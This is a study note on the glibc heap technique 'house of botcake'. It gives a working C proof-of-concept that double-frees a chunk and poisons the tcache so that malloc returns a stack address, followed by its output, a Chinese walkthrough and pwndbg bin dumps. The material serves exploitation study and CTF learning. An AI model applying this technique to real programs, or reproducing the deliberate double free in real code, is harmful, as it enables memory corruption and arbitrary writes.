# house_of_botcake

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>


int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/
    
    // simple tcache poisoning
    puts("Launch tcache poisoning");
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;
    
    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");
    
    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");

    return 0;
}
```

**result**

```c
This file demonstrates a powerful tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this demo, the stack).
This attack only relies on double free.

The address we want malloc() to return, namely,
the target address is 0x7ffe89e45290.

Preparing heap layout
Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.
Allocating a chunk for later consolidation
Allocating the victim chunk.
malloc(0x100): a=0x563791f05ae0.
Allocating a padding to prevent consolidation.

Now we are able to cause chunk overlapping
Step 1: fill up tcache list
Step 2: free the victim chunk so it will be added to unsorted bin
Step 3: free the previous chunk and make it consolidate with the victim chunk.
Step 4: add the victim chunk to tcache list by taking one out from it and free victim again

Launch tcache poisoning
Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk
We simply overwrite victim's fwd pointer
Now we can cash out the target chunk.
The new chunk is at 0x7ffe89e45290
Got control on target/stack!

Note:
And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim
In that case, once you have done this exploitation, you can have many arbitary writes very easily.
```

**analysis**

清空缓冲区，以防\_IO_FILE影响堆空间。申请七个chunk，用于之后填充tcache。

然后，申请prev，a和一个用于防止与top chunk合并的chunk。接着，就可以填充tcache了。

free(a)，free(prev)，a和prev会进入unsorted bin并且合并。

申请一个chunk，让tcache空出一个位置给victim，即a。free(a)，这时a被加入到了tcache，而我们free了a两次。

a被包含再一个更大的chunk中，我们申请一个大小为prev+a的头部的chunk，这样tcache没有能满足要求的chunk，就会把unsorted bin中那个a与pre合并的chunk进行分割，这样我们就获得了a的头部的控制。

修改a的fd指针，使其指向我们想要的内存空间，这样malloc与a大小相同的chunk，我们将a申请了出来，再次malloc一个，我们就得到了想要的内存空间。

**gdb**

free(a)，free(prev)

```c
pwndbg> bins
tcachebins
0x110 [  7]: 0x5555557578c0 —▸ 0x5555557577b0 —▸ 0x5555557576a0 —▸ 0x555555757590 —▸ 0x555555757480 —▸ 0x555555757370 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757ad0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757ad0
smallbins
empty
largebins
empty
```

malloc(0x100)

```c
pwndbg> bins
tcachebins
0x110 [  6]: 0x5555557577b0 —▸ 0x5555557576a0 —▸ 0x555555757590 —▸ 0x555555757480 —▸ 0x555555757370 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555557579c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555557579c0
smallbins
empty
largebins
empty
```

free(a)

```c
pwndbg> bins
tcachebins
0x110 [  7]: 0x555555757ae0 —▸ 0x5555557577b0 —▸ 0x5555557576a0 —▸ 0x555555757590 —▸ 0x555555757480 —▸ 0x555555757370 —▸ 0x555555757260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555557579c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555557579c0
smallbins
empty
largebins
empty
```

修改fd

```c
pwndbg> bins
tcachebins
0x110 [  7]: 0x555555757ae0 —▸ 0x7fffffffddc0 ◂— 9 /* '\t' */
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757af0
smallbins
empty
largebins
empty
```

malloc(c)

```c
pwndbg> bins
tcachebins
0x110 [  5]: 0x9
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555757af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555757af0
smallbins
empty
largebins
empty
```

